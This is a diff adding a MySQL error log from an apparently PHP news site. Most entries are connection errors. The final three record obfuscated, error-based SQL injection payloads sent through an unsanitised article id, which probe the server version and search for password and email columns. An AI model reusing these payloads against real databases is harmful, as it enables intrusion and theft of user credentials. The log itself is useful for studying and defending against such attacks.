@@ -1,0 +1,48 @@
+Time : 14:22:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 08:43:31
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 08:43:15
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 08:43:15
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 08:43:12
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 08:41:29
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 08:41:19
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 08:41:01
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 08:40:51
+SQLSTATE[HY000] [2002] Connection refused
+
+Time : 05:28:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 04:11:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 03:37:03
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d.sChEmA_nAmE=database() and lower(c./**//**/cOlUmN_nAmE) like 0x2570617373776f726425)),0)
+
+Time : 03:37:02
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,count(*),0x7e))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t.table_schema=d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c.table_schema=d./**//**/sChEmA_nAmE and c.table_name=t.tAblE_nAmE /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d.sChEmA_nAmE=database() and lower(c./**//**/cOlUmN_nAmE) like 0x25656d61696c25)),0)
+
+Time : 03:36:47
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.25-log~'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,version(),0x7e)))),0)
+
